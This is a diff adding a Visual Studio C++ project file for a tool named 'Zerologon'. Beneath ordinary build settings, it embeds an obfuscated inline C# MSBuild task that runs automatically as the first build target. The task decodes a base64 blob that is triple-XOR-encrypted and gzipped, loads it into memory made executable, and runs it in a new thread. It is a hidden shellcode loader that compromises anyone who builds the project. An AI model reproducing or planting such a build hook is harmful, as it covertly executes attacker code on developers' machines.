@@ -1,0 +1,154 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" InitialTargets="DiLDW7l34f">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{250e2a4d-5ddd-4515-aec9-4e122f58fcf6}</ProjectGuid>
+    <RootNamespace>Zerologon</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings"></ImportGroup>
+  <ImportGroup Label="Shared"></ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="main.cpp" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets"></ImportGroup>
+  <UsingTask TaskName="GTjWoFj4G4" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <Task>
+      <Code Type="Method" Language="cs"><![CDATA[[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualAlloc")]static extern System.IntPtr qj6yUa5(System.IntPtr a,uint s,uint t,uint p);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualProtect")]static extern bool aGd43j8(System.IntPtr a,uint s,uint p,out uint o);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="CreateThread")]static extern System.IntPtr wiGWMnO(System.IntPtr a,uint s,System.IntPtr e,System.IntPtr p,uint f,System.IntPtr t);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="WaitForSingleObject")]static extern uint vIx3FtQ(System.IntPtr h,uint ms);public override bool Execute(){var O6vjFt=System.Convert.FromBase64String("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");var dvpLW=System.Convert.FromBase64String("C2Bwy08qrKq/7ggbjipFSQUE8SOZya1ac2ffHtYW5Lk=");var mmxNq=System.Convert.FromBase64String("RPVjp+GG4D2HsvXnpdckXjB/qg4vhjtO6DuKsiAY5xI=");var zlMsj=System.Convert.FromBase64String("NAFR5NxZmtP79sUkI382Tdqdk/uuzafZrNP6E0WetaM=");for(int RB=0;RB<O6vjFt.Length;RB++){O6vjFt[RB]^=dvpLW[RB%32];}for(int RB=0;RB<O6vjFt.Length;RB++){O6vjFt[RB]^=mmxNq[RB%32];}for(int RB=0;RB<O6vjFt.Length;RB++){O6vjFt[RB]^=zlMsj[RB%32];}var rrzV=new System.IO.MemoryStream();using(var WnkZ=new System.IO.Compression.GZipStream(new System.IO.MemoryStream(O6vjFt),System.IO.Compression.CompressionMode.Decompress))WnkZ.CopyTo(rrzV);O6vjFt=rrzV.ToArray();var ctE0R=qj6yUa5(System.IntPtr.Zero,(uint)O6vjFt.Length,0x3000u,0x04u);System.Runtime.InteropServices.Marshal.Copy(O6vjFt,0,ctE0R,O6vjFt.Length);uint Wam=0;aGd43j8(ctE0R,(uint)O6vjFt.Length,0x20u,out Wam);vIx3FtQ(wiGWMnO(System.IntPtr.Zero,0u,ctE0R,System.IntPtr.Zero,0u,System.IntPtr.Zero),0xFFFFFFFFu);return true;}]]></Code>
+    </Task>
+  </UsingTask>
+  <Target Name="DiLDW7l34f">
+    <GTjWoFj4G4 />
+  </Target>
+</Project>
